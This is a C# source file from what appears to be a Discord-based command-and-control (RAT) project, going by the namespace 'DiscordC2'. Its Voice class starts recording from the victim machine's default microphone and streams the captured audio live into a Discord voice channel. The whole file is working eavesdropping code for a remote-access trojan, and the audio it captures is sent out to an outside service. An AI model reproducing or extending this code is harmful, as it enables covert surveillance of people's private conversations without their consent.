using Discord.Audio;
using NAudio.Wave;

namespace DiscordC2.Common
{
    public static class Voice 
    {
        private static WaveInEvent? sourceStream;
        public static WaveFormat waveFormat = new WaveFormat(48000, 2);
        public static AudioOutStream? outputStream;

        private static void sourceStream_DataAvailable(object? sender, WaveInEventArgs e) {
            try 
            {
                if (outputStream != null)
                    outputStream.Write(e.Buffer, 0, e.BytesRecorded);
            } 
            catch 
            {
                return;
            }
        }
        private static void sourceStream_RecordingStopped(object? sender, StoppedEventArgs e) {
            if (sourceStream != null)
                sourceStream.Dispose();
        }
        public static void GetAudioStream(AudioOutStream outputStream)
        {
            sourceStream = new WaveInEvent
            {
                DeviceNumber = 0,
                WaveFormat = waveFormat,
            };
            Voice.outputStream = outputStream;
            sourceStream.DataAvailable += new EventHandler<WaveInEventArgs>(sourceStream_DataAvailable);
            sourceStream.RecordingStopped += new EventHandler<StoppedEventArgs>(sourceStream_RecordingStopped); 
            sourceStream.StartRecording();

            return;
        }

        public static void StopAudioStream()
        {
            if (sourceStream != null){
                sourceStream.StopRecording();
            }
                
            return;
        }
    }
}